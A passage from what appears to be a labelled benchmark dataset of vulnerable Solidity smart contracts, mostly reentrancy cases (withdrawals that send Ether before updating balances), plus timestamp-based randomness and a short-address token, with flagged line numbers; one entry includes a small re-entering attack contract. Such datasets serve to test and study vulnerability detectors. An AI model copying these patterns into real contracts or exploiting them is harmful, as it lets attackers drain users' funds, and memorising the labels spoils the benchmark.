 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.25;
contract W_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function W_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[26]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 41
 */
pragma solidity ^0.4.19;
contract ETH_VAULT
{
    mapping (address => uint) public balances;
    Log TransferLog;
    uint public MinDeposit = 1 ether;
    function ETH_VAULT(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender])
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[34]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.25;
contract X_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function X_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[26]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract ETH_FUND
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    uint lastBlock;
    function ETH_FUND(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
            lastBlock = block.number;
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender]&&block.number>lastBlock)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[36]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 63
 */
pragma solidity ^0.4.19;
contract PENNY_BY_PENNY  
{
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Put(uint _lockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[52]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 54
 */
pragma solidity ^0.4.19;
contract DEP_BANK 
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[44]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 40
 */
pragma solidity ^0.4.19;
contract Private_Bank
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    function Private_Bank(address _log)
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender])
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[33]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 38
 */
pragma solidity ^0.4.19;
contract PrivateBank
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    function PrivateBank(address _lib)
    {
        TransferLog = Log(_lib);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {            
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[31]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 41
 */
pragma solidity ^0.4.19;
contract ETH_VAULT
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    function ETH_VAULT(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender])
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[34]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 63
 */
pragma solidity ^0.4.19;
contract MONEY_BOX   
{
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    uint public MinSum;
    Log LogFile;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        LogFile = Log(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Put(uint _lockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[52]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.25;
contract WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[26]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.25;
contract MY_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function MY_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[26]
"/*
 * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/reentrant.sol
 * @author: -
 * @vulnerable_at_lines: 21
 */
pragma solidity ^0.4.0;
contract EtherBank{
    mapping (address => uint) userBalances;
    function getBalance(address user) constant returns(uint) {  
		return userBalances[user];
	}
	function addToBalance() {  
		userBalances[msg.sender] += msg.value;
	}
	function withdrawBalance() {  
		uint amountToWithdraw = userBalances[msg.sender];
        // <yes> <report> REENTRANCY
		if (!(msg.sender.call.value(amountToWithdraw)())) { throw; }
		userBalances[msg.sender] = 0;
	}    
}",[18]
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 27
 */
//added pragma version
pragma solidity ^0.4.10;
contract EtherStore {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        // <yes> <report> REENTRANCY
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }",[22]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: - 
 * @vulnerable_at_lines: 15
 */
pragma solidity ^0.4.24;
contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = ""Nu Token"";
  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }
  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked(""Nu Token"")) == Bank(msg.sender).supportsToken());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}
contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked(""Nu Token"")));
    }
}
contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked(""Nu Token"")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}",[12]
"/*
 * @source: https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488
 * @author: Alejandro Santander
 * @vulnerable_at_lines: 24
 */
pragma solidity ^0.4.18;
contract Reentrance {
  mapping(address => uint) public balances;
  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      // <yes> <report> REENTRANCY
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  function() public payable {}
}",[18]
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/
 * @author: consensys
 * @vulnerable_at_lines: 28
 */
pragma solidity ^0.4.24;
contract Reentrancy_bonus{
    // INSECURE
    mapping (address => uint) private userBalances;
    mapping (address => bool) private claimedBonus;
    mapping (address => uint) private rewardsForA;
    function withdrawReward(address recipient) public {
        uint amountToWithdraw = rewardsForA[recipient];
        rewardsForA[recipient] = 0;
        (bool success, ) = recipient.call.value(amountToWithdraw)("""");
        require(success);
    }
    function getFirstWithdrawalBonus(address recipient) public {
        require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once
        rewardsForA[recipient] += 100;
        // <yes> <report> REENTRANCY
        withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
        claimedBonus[recipient] = true;
    }
}",[22]
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/
 * @author: consensys
 * @vulnerable_at_lines: 24
 */
pragma solidity ^0.4.24;
contract Reentrancy_cross_function {
    // INSECURE
    mapping (address => uint) private userBalances;
    function transfer(address to, uint amount) {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        // <yes> <report> REENTRANCY
        (bool success, ) = msg.sender.call.value(amountToWithdraw)(""""); // At this point, the caller's code is executed, and can call transfer()
        require(success);
        userBalances[msg.sender] = 0;
    }
}",[19]
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 18
 */
pragma solidity ^0.4.19;
contract ReentrancyDAO {
    mapping (address => uint) credit;
    uint balance;
    function withdrawAll() public {
        uint oCredit = credit[msg.sender];
        if (oCredit > 0) {
            balance -= oCredit;
            // <yes> <report> REENTRANCY
            bool callResult = msg.sender.call.value(oCredit)();
            require (callResult);
            credit[msg.sender] = 0;
        }
    }
    function deposit() public payable {
        credit[msg.sender] += msg.value;
        balance += msg.value;
    }
}",[15]
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/
 * @author: consensys
 * @vulnerable_at_lines: 17
 */
pragma solidity ^0.5.0;
contract Reentrancy_insecure {
    // INSECURE
    mapping (address => uint) private userBalances;
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        // <yes> <report> REENTRANCY
        (bool success, ) = msg.sender.call.value(amountToWithdraw)(""""); // At this point, the caller's code is executed, and can call withdrawBalance again
        require(success);
        userBalances[msg.sender] = 0;
    }
}",[13]
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/Reentrancy.sol
 * @author: -
 * @vulnerable_at_lines: 24
 */
 pragma solidity ^0.4.15;
 contract Reentrance {
     mapping (address => uint) userBalance;
     function getBalance(address u) constant returns(uint){
         return userBalance[u];
     }
     function addToBalance() payable{
         userBalance[msg.sender] += msg.value;
     }
     function withdrawBalance(){
         // send userBalance[msg.sender] ethers to msg.sender
         // if mgs.sender is a contract, it will call its fallback function
         // <yes> <report> REENTRANCY
         if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
             throw;
         }
         userBalance[msg.sender] = 0;
     }
 }",[19]
"/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao
 * @author: -
 * @vulnerable_at_lines: 19
 */
pragma solidity ^0.4.2;
contract SimpleDAO {
  mapping (address => uint) public credit;
  function donate(address to) payable {
    credit[to] += msg.value;
  }
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      // <yes> <report> REENTRANCY
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }
  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}",[15]
"         HumanStandardToken token;
     }
     // virtual-channel state
     struct VirtualChannel {
         bool isClose;
         bool isInSettlementState;
         uint256 sequence;
         address challenger; // Initiator of challenge
         uint256 updateVCtimeout; // when update VC times out
         // channel state
         address partyA; // VC participant A
         address partyB; // VC participant B
         address partyI; // LC hub
         uint256[2] ethBalances;
         uint256[2] erc20Balances;
         uint256[2] bond;
         HumanStandardToken token;
     }
     mapping(bytes32 => VirtualChannel) public virtualChannels;
     mapping(bytes32 => Channel) public Channels;
     function createChannel(
         bytes32 _lcID,
         address _partyI,
         uint256 _confirmTime,
         address _token,
         uint256[2] _balances // [eth, token]
     )
         public
         payable
     {
         require(Channels[_lcID].partyAddresses[0] == address(0), ""Channel has already been created."");
         require(_partyI != 0x0, ""No partyI address provided to LC creation"");
         require(_balances[0] >= 0 && _balances[1] >= 0, ""Balances cannot be negative"");
         // Set initial ledger channel state
         // Alice must execute this and we assume the initial state
         // to be signed from this requirement
         // Alternative is to check a sig as in joinChannel
         Channels[_lcID].partyAddresses[0] = msg.sender;
         Channels[_lcID].partyAddresses[1] = _partyI;
         if(_balances[0] != 0) {
             require(msg.value == _balances[0], ""Eth balance does not match sent value"");
             Channels[_lcID].ethBalances[0] = msg.value;
         }
         if(_balances[1] != 0) {
             Channels[_lcID].token = HumanStandardToken(_token);
             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),""CreateChannel: token transfer failure"");
             Channels[_lcID].erc20Balances[0] = _balances[1];
         }
         Channels[_lcID].sequence = 0;
         Channels[_lcID].confirmTime = _confirmTime;
         // is close flag, lc state sequence, number open vc, vc root hash, partyA...
         //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);
         Channels[_lcID].LCopenTimeout = now + _confirmTime;
         Channels[_lcID].initialDeposit = _balances;
         emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);
     }
     function LCOpenTimeout(bytes32 _lcID) public {
         require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);
         require(now > Channels[_lcID].LCopenTimeout);
         if(Channels[_lcID].initialDeposit[0] != 0) {
             // <yes> <report> REENTRANCY
             Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);
         }
         if(Channels[_lcID].initialDeposit[1] != 0) {
             // <yes> <report> REENTRANCY
             require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),""CreateChannel: token transfer failure"");
         }
         emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);
         // only safe to delete since no action was taken on this channel
         delete Channels[_lcID];
     }
     function joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {
         // require the channel is not open yet
         require(Channels[_lcID].isOpen == false);
         require(msg.sender == Channels[_lcID].partyAddresses[1]);
         if(_balances[0] != 0) {
             require(msg.value == _balances[0], ""state balance does not match sent value"");
             Channels[_lcID].ethBalances[1] = msg.value;
         }
         if(_balances[1] != 0) {
             require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),""joinChannel: token transfer failure"");
             Channels[_lcID].erc20Balances[1] = _balances[1];
         }
         Channels[_lcID].initialDeposit[0]+=_balances[0];
         Channels[_lcID].initialDeposit[1]+=_balances[1];
         // no longer allow joining functions to be called
         Channels[_lcID].isOpen = true;
         numChannels++;
         emit DidLCJoin(_lcID, _balances[0], _balances[1]);
     }
     // additive updates of monetary state
     // TODO check this for attack vectors
     function deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {
         require(Channels[_lcID].isOpen == true, ""Tried adding funds to a closed channel"");
         require(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);
         //if(Channels[_lcID].token)
         if (Channels[_lcID].partyAddresses[0] == recipient) {
             if(isToken) {
                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),""deposit: token transfer failure"");
                 Channels[_lcID].erc20Balances[2] += _balance;
             } else {
                 require(msg.value == _balance, ""state balance does not match sent value"");
                 Channels[_lcID].ethBalances[2] += msg.value;
             }
         }
         if (Channels[_lcID].partyAddresses[1] == recipient) {
             if(isToken) {
                 require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),""deposit: token transfer failure"");
                 Channels[_lcID].erc20Balances[3] += _balance;
             } else {
                 require(msg.value == _balance, ""state balance does not match sent value"");
                 Channels[_lcID].ethBalances[3] += msg.value;
             }
         }
         emit DidLCDeposit(_lcID, recipient, _balance, isToken);
     }
     // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update
     function consensusCloseChannel(
         bytes32 _lcID,
         uint256 _sequence,
         uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI
         string _sigA,
         string _sigI
     )
         public
     {
         // assume num open vc is 0 and root hash is 0x0
         //require(Channels[_lcID].sequence < _sequence);","[62, 66]"
"/*
 * @source: https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/
 * @author: -
 * @vulnerable_at_lines: 18
 */
 pragma solidity ^0.4.11;
 contract MyToken {
     mapping (address => uint) balances;
     event Transfer(address indexed _from, address indexed _to, uint256 _value);
     function MyToken() {
         balances[tx.origin] = 10000;
     }
     // <yes> <report> SHORT_ADDRESSES
     function sendCoin(address to, uint amount) returns(bool sufficient) {
         if (balances[msg.sender] < amount) return false;
         balances[msg.sender] -= amount;
         balances[to] += amount;
         Transfer(msg.sender, to, amount);
         return true;
     }
     function getBalance(address addr) constant returns(uint) {
         return balances[addr];
     }
 }",[14]
"/*
 * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620
 * @source: https://etherscan.io/address/0xa11e4ed59dc94e69612f3111942626ed513cb172#code
 * @vulnerable_at_lines: 43
 * @author: -
 */
 pragma solidity ^0.4.15;
/// @title Ethereum Lottery Game.
contract EtherLotto {
    // Amount of ether needed for participating in the lottery.
    uint constant TICKET_AMOUNT = 10;
    // Fixed amount fee for each lottery game.
    uint constant FEE_AMOUNT = 1;
    // Address where fee is sent.
    address public bank;
    // Public jackpot that each participant can win (minus fee).
    uint public pot;
    // Lottery constructor sets bank account from the smart-contract owner.
    function EtherLotto() {
        bank = msg.sender;
    }
    // Public function for playing lottery. Each time this function
    // is invoked, the sender has an oportunity for winning pot.
    function play() payable {
        // Participants must spend some fixed ether before playing lottery.
        assert(msg.value == TICKET_AMOUNT);
        // Increase pot for each participant.
        pot += msg.value;
        // Compute some *almost random* value for selecting winner from current transaction.
        // <yes> <report> TIME_MANIPULATION
        var random = uint(sha3(block.timestamp)) % 2;
        // Distribution: 50% of participants will be winners.
        if (random == 0) {
            // Send fee to bank account.
            bank.transfer(FEE_AMOUNT);
            // Send jackpot to winner.
            msg.sender.transfer(pot - FEE_AMOUNT);
            // Restart jackpot.
            pot = 0;
        }
    }
}",[31]
"/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental
 * @author: -
 * @vulnerable_at_lines: 27
 */
//added pragma version
pragma solidity ^0.4.0;
contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;
  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }
  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
